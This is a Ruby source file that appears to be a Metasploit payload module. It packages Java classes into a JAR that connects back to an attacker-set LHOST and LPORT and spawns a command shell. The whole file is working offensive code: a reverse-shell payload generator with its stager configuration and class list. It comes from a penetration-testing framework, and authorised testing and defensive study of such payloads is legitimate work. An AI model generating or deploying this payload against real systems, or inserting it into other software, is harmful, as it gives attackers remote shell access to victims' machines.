##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 7544

  include Msf::Payload::Single
  include Msf::Payload::Java
  include Msf::Sessions::CommandShellOptions

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'Java Command Shell, Reverse TCP Inline',
      'Description' => 'Connect back to attacker and spawn a command shell',
      'Author'      => ['mihi', 'egypt'],
      'License'     => MSF_LICENSE,
      'Platform'    => ['java'],
      'Arch'        => ARCH_JAVA,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'Payload'     => {'Offsets' => {}, 'Payload' => ''}
      ))
  end

  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new
    jar.add_sub("metasploit") if opts[:random]
    class_files.each do |path|
      1.upto(path.length - 1) do |idx|
        full = path[0,idx].join("/") + "/"
        if !(jar.entries.map{|e|e.name}.include?(full))
          jar.add_file(full, '')
        end
      end
      data = MetasploitPayloads.read('java', path)
      jar.add_file(path.join("/"), data)
    end
    jar.build_manifest(:main_class => "metasploit.Payload")
    jar.add_file("metasploit.dat", stager_config(opts))

    jar
  end

  def stager_config(opts={})
    ds = opts[:datastore] || datastore
    c =  ""
    c << "LHOST=#{ds["LHOST"]}\n" if ds["LHOST"]
    c << "LPORT=#{ds["LPORT"]}\n" if ds["LPORT"]
    # Magical, means use stdin/stdout.  Used for debugging
    #c << "LPORT=0\n"
    c << "EmbeddedStage=Shell\n"

    c
  end

  def class_files
    [
      ['metasploit', 'Payload.class'],
      ['javapayload', 'stage', 'Stage.class'],
      ['javapayload', 'stage', 'StreamForwarder.class'],
      ['javapayload', 'stage', 'Shell.class'],
    ]
  end
end
